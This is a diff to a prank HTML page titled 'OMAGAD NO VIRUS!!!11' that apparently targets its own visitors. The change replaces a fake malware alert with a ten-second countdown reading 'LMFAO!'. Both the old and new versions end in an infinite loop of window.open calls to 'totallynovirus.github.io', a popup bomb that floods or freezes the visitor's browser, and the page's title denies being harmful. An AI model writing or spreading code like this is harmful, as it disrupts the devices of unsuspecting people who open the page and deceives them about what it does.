@@ -1,14 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>NO NOOB VIRUS!!!11!!</title>
+<title>OMAGAD NO VIRUS!!!11</title>
+<style>
+.counter {
+	line-height: 0px;
+	font-family: Arial;
+    font-size: 150px;
+    text-shadow: 0 0 3px #FF0000, 0 0 5px #0000FF;
+}
+</style>
 </head>
 <body>
+<center><h1 id="progressBar" class="counter">...</h1></center>
 <script>
-alert("ERROR UR PC GOT MALWARE OMG!!!")
-while (true) {
-  window.open("https://totallynovirus.github.io/");
-}
+var timeleft = 10;
+var downloadTimer = setInterval(function(){
+  if(timeleft <= 0){
+    document.getElementById("progressBar").innerHTML = "LMFAO!";
+	while (true) {
+  		window.open("https://totallynovirus.github.io/");
+	}
+    clearInterval(downloadTimer);
+  }
+  document.getElementById("progressBar").innerHTML = timeleft;
+  timeleft -= 1;
+}, 1000);
+
 </script>
 </body>
+
 </html>
